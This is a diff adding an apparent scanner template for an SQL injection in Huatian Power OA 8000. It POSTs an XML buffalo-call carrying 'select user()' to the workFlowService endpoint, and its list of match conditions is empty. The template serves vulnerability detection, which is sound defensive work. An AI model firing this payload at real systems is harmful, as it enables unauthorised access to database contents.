@@ -1,0 +1,21 @@
+id: huatian-oa-sqli
+brief:
+    title: Huatian Power OA 8000 - SQL Injection
+    by: ritikchaddha
+    level: high
+    about: There is a SQL injection vulnerability in the workFlowService interface of Huatian Power OA 8000. An attacker can exploit this vulnerability to obtain sensitive database information.
+    label:
+        - huatian
+        - oa
+        - sqli
+        - vuln
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/OAapp/bfapp/buffalo/workFlowService'
+      body: |-
+        <buffalo-call>
+        <method>getDataListForTree</method>
+        <string>select user()</string>
+        </buffalo-call>
+      signs: []
